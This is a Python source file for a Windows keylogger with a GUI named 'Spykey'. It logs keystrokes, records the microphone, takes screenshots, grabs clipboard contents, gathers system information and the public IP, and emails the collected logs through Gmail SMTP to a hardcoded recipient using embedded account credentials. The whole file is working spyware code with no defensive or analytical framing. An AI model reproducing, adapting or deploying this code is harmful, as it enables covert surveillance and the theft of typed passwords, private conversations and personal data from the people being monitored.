# Libraries
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
# For collecting computer information
import socket  #used to send message
import platform #info about os
import win32clipboard #clipboard 
import re#regular expression
from pathlib import Path
# key strokes
from pynput.keyboard import Key, Listener

import time
import os
import playsound
from playsound import playsound
# microphone
from scipy.io.wavfile import write
import sounddevice as sd
# encrypting the files
from cryptography.fernet import Fernet#symmetric cryptography

import getpass
from requests import get
import multiprocessing
# screenshot
from multiprocessing import Process, freeze_support
from PIL import ImageGrab, ImageTk, Image
import threading
import tkinter as tk
from tkinter import ttk
from tkinter import *
from time import strftime
from PIL import Image, ImageTk


# Date function
from datetime import date

today = str(date.today())


keys_information = "key_log.txt"
sys_info = "sys_info.txt"
clipboard_info = "clipboard.txt"
audio_info = "audio_info.wav"
ss_info = "screenshot.jpg"

microphone_time = 15
time_iteration = 45
number_of_iteration_end = 10

email_user = "momokiki123499@gmail.com"
email_password = "cs"
email_send = "j1412002@gmail.com"

subject = 'Keylogger Logs'

file_path = "C:\\Users\\Dell\\PycharmProjects\\keylogger"
extend = "\\"
log = os.listdir(file_path)


def send_email(filename, attachment, email_send):
    o1 = "Sending The files to Email \n"
    o2 = "Files sent to Email \n"
    io_box.insert(INSERT, o1)
    print(o1)
    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = email_send
    msg['Subject'] = subject
    body = "Please find attached Text File below"
    msg.attach(MIMEText(body, 'plain'))

    attachment = open(attachment, 'rb')
    for file in filename:
        dir_path = os.path.join(file_path, file)
        part = MIMEApplication(open(dir_path, "rb").read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment', filename="%s" % file)
        msg.attach(part)
    text = msg.as_string()
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.ehlo()
    server.login(email_user, email_password)

    server.sendmail(email_user, email_send, text)
    io_box.insert(INSERT, o2)
    print(o2)
    server.quit()


def computer_info():
    o1 = "Collecting System Information \n"
    o2 = "Information Collected \n"
    io_box.insert(INSERT, o1)
    print()
    with open(file_path + extend + sys_info, "a") as f:
        hostname = socket.gethostname()
        ipadd = socket.gethostbyname(hostname)
        try:
            public_ip = get("http://myip.dnsomatic.com").text
            f.write("Public IP address: " + public_ip + "\n")

        except Exception:
            f.write("couldn't get ip address " + "\n")

        f.write("Processor:" + (platform.processor()) + "\n")
        f.write("system:" + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("hostname: " + hostname + "\n")
        f.write("Private ip : " + ipadd + "\n")
        io_box.insert(INSERT, o2)
        print(o2)


def copy_clipboard():
    o1 = "Copying Clipboard Data \n"
    o2 = "Clipboard Data Copied \n"
    io_box.insert(INSERT, o1)
    print(o1)
    with open(file_path + extend + clipboard_info, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.seek(0)
            f.write("clipboard Data: " + pasted_data + "\n")
            f.truncate()

        except:
            f.write("couldn't copy clipboard" + "\n")
        io_box.insert(INSERT, o2)
        print(o2)


def microphone():
    o1 = "Recording the Conversation \n"
    o2 = "Conversation Recorded \n"
    io_box.insert(INSERT, o1)
    print(o1)
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_info, fs, myrecording)
    io_box.insert(INSERT, o2)
    print(o2)


def screenshot():
    o1 = "Screenshot Taken \n"
    io_box.insert(INSERT, o1)
    print(o1)
    img = ImageGrab.grab()
    img.save(file_path + extend + ss_info)


def deleting():
    delete_file = list.get(list.curselection())
    with open(file_path + extend + delete_file, "r+") as d:
        d.truncate(0)
        d.close()


number_of_iteration = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration
count = 0
keys = []
stop = 0


def stopping():
    global stop
    stop = 1


def start():
    global number_of_iteration, stoppingTime, currentTime
    io_box.delete("1.0", "end")
    o1 = "Key strokes are now being recorded \n"
    io_box.insert(1.0, o1)
    print(o1)

    while number_of_iteration < number_of_iteration_end:

        count = 0
        keys = []

        if stop == 1:
            print("Keylogger Stopped")
            break

        def on_press(key):
            global keys, count, currentTime
            io_box.insert(INSERT, key)
            print(key)
            keys.append(key)
            count += 1
            currentTime = time.time()

            if count >= 1:
                count = 0
                write_file(keys)
                keys = []

        def write_file(keys):
            with open(file_path + extend + keys_information, "a") as f:
                for key in keys:
                    k = str(key).replace("'", "")
                    if k.find("space") > 0:
                        f.write('\n')
                        f.close()
                    elif k.find("Key") == -1:
                        f.write(k)
                        f.close()

        def on_release(key):
            if key == Key.esc:
                return False
            if currentTime > stoppingTime:
                return False

        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

        io_box.insert(INSERT, "\n")

        if stop == 1:
            o2 = "Keylogger Stopped \n"
            io_box.insert(INSERT, o2)
            print(o2)
            break

        if currentTime > stoppingTime:
            with open(file_path + extend + keys_information, "a") as f:
                f.write(" ")

            # computer_info()
            # microphone()
            # screenshot()
            # copy_clipboard()
            if stop == 1:
                o2 = "Keylogger Stopped \n"
                io_box.insert(INSERT, o2)
                print(o2)
                break

            # send_email(log, file_path + extend, email_send)
            number_of_iteration += 1
            stoppingTime = time.time() + time_iteration


n1 = 1
r = tk.Tk()
frame = tk.Frame(r)
frame.pack()
width = r.winfo_screenwidth()
height = r.winfo_screenheight()
r.geometry("%dx%d" % (width, height))
r.title("Spykey")
r.iconbitmap("C:\\Users\\Dell\\PycharmProjects\\keylogger\\logo\\download.jpg")
bgimg = ImageTk.PhotoImage(file="C:\\Users\\Dell\\PycharmProjects\\keylogger\\logo\\logo.webp")
limg = Label(r, image=bgimg)
limg.pack()
title = Label(r, text="SPYKEY", font=("Lucida Fax", 40), fg="#e2cb97", bg="#202a1f")
title.place(x=0, y=1)


# subt = Label(r, text="An Advance KeyLogger", font=("Lucida Fax", 18), fg="Black", bg="#146b88")
# subt.place(x=0, y=60)


def clock():
    string = strftime('%H:%M:%S %p')
    watch.config(text=string)
    watch.after(1000, clock)


watch = Label(r, font=('calibri', 17, 'bold'), background='black', foreground='green')
watch.place(x=1400, y=1)
clock()

text = tk.Text(r, height=15, width=75, bg='#232526', fg='white')
text.place(x=900, y=100)
io_box = tk.Text(r, height=15, width=75, bg='#232526', fg='green')
io_box.place(x=900, y=460)

t1 = threading.Thread(target=start)
p1 = PhotoImage(Image.open("C:\\Users\\Dell\\Downloads\\download.jpg")).subsample(3, 3)
b1 = tk.Button(r, text='Start', image=p1, width=75, activebackground='#333333', activeforeground="white", bg="#bec8d1",
               relief='raised', compound=LEFT, command=lambda: t1.start())
b1.place(x=20, y=700)
p2 = PhotoImage(Image.open("C:\\Users\\Dell\\Downloads\\download.jpg")).subsample(3, 3)
b2 = tk.Button(r, text='Send Email', image=p2, width=100, activebackground='#333333', activeforeground="white",
               bg="#bec8d1", relief='raised', compound=LEFT,
               command=lambda: threading.Thread(target=send_email(keys_information, file_path + extend + keys_information , email_send)).start())
b2.place(x=20, y=400)
p3 = PhotoImage(Image.open("C:\\Users\\Dell\\Downloads\\download.jpg")).subsample(3, 3)
b3 = tk.Button(r, text='Microphone', image=p3, width=100, activebackground='#333333', activeforeground="white",
               bg="#bec8d1", relief='raised', compound=LEFT,
               command=lambda: threading.Thread(target=microphone).start())
b3.place(x=20, y=350)
p4 = PhotoImage(Image.open("C:\\Users\\Dell\\Downloads\\download.jpg")).subsample(3, 3)
b4 = tk.Button(r, text='Screenshot', image=p4, width=100, activebackground='#333333', activeforeground="white",
               bg="#bec8d1", relief='raised', compound=LEFT, command=lambda: screenshot())
b4.place(x=20, y=300)
p5 = PhotoImage(Image.open("C:\\Users\\Dell\\Downloads\\download.jpg")).subsample(3, 3)
b5 = tk.Button(r, text='Clipboard Data', image=p5, width=100, activebackground='#333333', activeforeground="white",
               bg="#bec8d1", relief='raised', compound=LEFT, command=lambda: copy_clipboard())
b5.place(x=20, y=250)
p6 = PhotoImage(Image.open("C:\\Users\\Dell\\Downloads\\download.jpg")).subsample(3, 3)
b6 = tk.Button(r, text='System Info', image=p6, width=100, activebackground='#333333', activeforeground="white",
               bg="#bec8d1", relief='raised', compound=LEFT, command=lambda: computer_info())
b6.place(x=20, y=200)
p8 = PhotoImage(Image.open("C:\\Users\\Dell\\Downloads\\download.jpg")).subsample(3, 3)
b8 = tk.Button(r, text='Exit', image=p8, width=75, activebackground='#333333', activeforeground="white", bg="#bec8d1",
               relief='raised', command=lambda: r.destroy(), compound=LEFT)
b8.place(x=220, y=700)
p9 = PhotoImage(Image.open("C:\\Users\\Dell\\Downloads\\download.jpg")).subsample(3, 3)
b9 = tk.Button(r, text='Stop', image=p9, width=75, activebackground='#333333', activeforeground="white", bg="#bec8d1",
               relief='raised', command=lambda: stopping(), compound=LEFT)
b9.place(x=120, y=700)

l1 = Label(r, text='Files list', bg="#bec8d1", )
l2 = Label(r, text="File Content", bg="#bec8d1", )
l3 = Label(r, text="Output Console", bg="#232526", fg="green")
list = Listbox(r, height=10, width=20, bg="#c0c0c0", fg="#181818", font='TimesNewRoman', selectmode=SINGLE)
for f in log:
    list.insert(n1, f)
    n1 = n1 + 1
    if (n1>len(log)):
        n1 = 1

list.place(x=250, y=200)
l1.place(x=250, y=170)
l2.place(x=900, y=70)
l3.place(x=900, y=430)


def open_file():
    text.delete('1.0', "end")
    file = list.get(list.curselection())

    with open(file_path + extend + file, "r") as f:
        if file == 'screenshot.jpg':
            r2 = tk.Toplevel()
            img = Image.open("C:\\Users\\Dell\\PycharmProjects\\keylogger\\screenshot.png").resize(
                (1530, 790), Image.Resampling.LANCZOS)
            image = ImageTk.PhotoImage(img)
            l2 = tk.Label(r2, image=image)
            l2.image = image
            l2.place(x=0, y=0)

        elif file == "audio_info.wav":
            s1 = threading.Thread(target=playsound("C:\\Users\\Dell\\PycharmProjects\\keylogger\\audio.wav"))
            s1.start()

        else:
            text.insert('1.0', f.read())

        f.close()


b7 = tk.Button(r, text='Open File', width=15, activebackground='#333333', bg="#bec8d1", relief='raised',
               activeforeground="white", fg="black", command=lambda: open_file())
b7.place(x=360, y=420)
b9 = tk.Button(r, text="Clear", width=15, activebackground='#333333', bg="#bec8d1", activeforeground="white",
               relief='raised', command=lambda: deleting())
b9.place(x=1350, y=350)
r.mainloop()
